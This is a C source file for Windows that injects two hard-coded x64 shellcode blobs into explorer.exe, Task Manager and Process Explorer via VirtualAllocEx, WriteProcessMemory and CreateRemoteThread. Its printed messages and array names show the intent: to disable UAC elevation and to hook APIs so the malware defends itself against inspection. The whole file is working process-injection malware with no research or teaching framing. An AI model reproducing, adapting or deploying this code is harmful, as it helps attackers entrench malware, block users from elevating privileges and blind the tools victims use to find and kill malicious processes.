
#include "Windows.h"
#include <stdio.h>
#include <Tlhelp32.h>


DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

void uacdis(LPCTSTR process) {
	HANDLE remoteThread;
	PVOID remoteBuffer;
	HANDLE prohand = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName(process));
	unsigned char  prevent_elevate_64[] = "\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a\xc3\xe8\x37\x00\x00\x00\x48\x83\xc4\x20\x6a\x00\x49\x89\xe1\x41\xb8\x40\x00\x00\x00\xba\x04\x00\x00\x00\x48\x89\xf1\xff\xd0\x58\xe8\x04\x00\x00\x00\x48\x31\xc0\xc3\x5a\xb9\x04\x00\x00\x00\x8a\x02\x88\x06\x48\xff\xc6\x48\xff\xc2\xe2\xf4\x53\xc3\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x71\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x66\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x55\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xc3\x58\x41\x59\x5a\x48\x8b\x12\xe9\x50\xff\xff\xff\x5d\x41\xba\x2d\xf9\x7f\xe5\xff\xd5\x41\xba\x75\x1f\x0a\x33\xff\xd5\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
	remoteBuffer = VirtualAllocEx(prohand, NULL, sizeof prevent_elevate_64, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(prohand, remoteBuffer, prevent_elevate_64, sizeof prevent_elevate_64, NULL);
	remoteThread = CreateRemoteThread(prohand, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(prohand);
}

void apihk(LPCTSTR process) {
	HANDLE remoteThread2;
	PVOID remoteBuffer2;
	HANDLE prohand = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName(process));
	unsigned char  self_defense_64[] = "\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a\xc3\xe8\x37\x00\x00\x00\x48\x83\xc4\x20\x6a\x00\x49\x89\xe1\x41\xb8\x40\x00\x00\x00\xba\x04\x00\x00\x00\x48\x89\xf1\xff\xd0\x58\xe8\x04\x00\x00\x00\x48\x31\xc0\xc3\x5a\xb9\x04\x00\x00\x00\x8a\x02\x88\x06\x48\xff\xc6\x48\xff\xc2\xe2\xf4\x53\xc3\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x71\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x66\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x55\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xc3\x58\x41\x59\x5a\x48\x8b\x12\xe9\x50\xff\xff\xff\x5d\x41\xba\x87\xDC\xCA\x5E\xff\xd5\x41\xba\xA3\x9D\xA1\x23\xff\xd5\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
	remoteBuffer2 = VirtualAllocEx(prohand, NULL, sizeof self_defense_64, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(prohand, remoteBuffer2, self_defense_64, sizeof self_defense_64, NULL);
	remoteThread2 = CreateRemoteThread(prohand, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer2, NULL, 0, NULL);
	CloseHandle(prohand);
}

int main()
{

	uacdis(L"explorer.exe");
	uacdis(L"Taskmgr.exe");
	uacdis(L"procexp64.exe");
	printf("UAC elevation disabled !\n");

	apihk(L"explorer.exe");
	apihk(L"Taskmgr.exe");
	apihk(L"procexp64.exe");
	printf("API hooked !");
	return 0;
}